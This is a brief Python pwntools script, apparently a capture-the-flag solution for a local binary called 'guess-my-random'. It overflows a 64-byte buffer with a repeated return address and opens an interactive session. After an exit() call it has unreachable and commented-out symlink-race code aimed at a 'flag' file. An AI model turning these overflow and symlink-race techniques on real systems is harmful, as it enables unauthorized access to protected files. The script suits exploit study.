#!/usr/bin/env python

from pwn import *
import os

p = process ("./guess-my-random")


buf =  p32(0x804863b) #+ "BBBBCCCCDDDDEEEEFFFFGGGG"

while len(buf) < 64:
    buf += p32(0x804863b)


with open("e.txt", "w") as f:
    f.write(buf)
f.close()

p.sendline(buf)

p.interactive()

exit()

sleep(1)

os.remove("file1")
os.symlink("flag", "file1")

p.interactive()



"""
while True:
    with open("a", "w"):
        pass
    os.unlink("a")
    os.symlink("flag", "a")
"""
